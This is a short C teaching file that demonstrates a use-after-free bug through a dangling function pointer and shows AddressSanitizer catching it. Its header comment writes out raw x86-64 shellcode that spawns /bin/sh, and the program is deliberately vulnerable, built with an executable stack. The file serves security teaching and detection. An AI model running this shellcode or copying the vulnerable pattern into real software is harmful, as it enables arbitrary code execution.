
/* **********************************************

Basic UAF example

1) compilation

gcc -z execstack -o uaf2 uaf2.c

2) Harmless execution

./uaf2 toto  (leads to a segfault)

3) More dangerous execution (opens a shell !)

./uaf2  $(printf "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05")

4) Compilation with Asan to detect the UAF (and stops the execution)

gcc -g -fsanitize=address -z execstack -o uaf2 uaf2.c
./uaf2  $(printf "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05")

********************************************** */

#include <stdio.h>
#include <string.h>
#include <stdlib.h>

typedef struct {void (*f)(void);} st;  // field f of struct st is a function pointer 

void nothing (){ printf("Nothing\n"); } // a safe function

int main(int argc , char * argv [])
{ 
st *p1, *p2;

p1=(st*) malloc(sizeof(st)); // allocates to p1 a block to a struct st 
p1 ->f=&nothing; // p1->f now points to function nothing()
p1 ->f();   // executes nothing()

free(p1);  // p1 is now dangling ...

p2=(st*)malloc(sizeof(st)); // allocates to p2 a block to a struct st 

if ((void (*)(void))p1==(void (*)(void))p2) { printf("OK\n"); } // p1 and p2 are (implicit) aliases !


p2->f=(void(*)(void)) (argv[1]); // p2->f now points to buffer argv[1]

p1->f();  // executing p1->f does execute p2->f (hence may open a shell ...)
return 0;
}
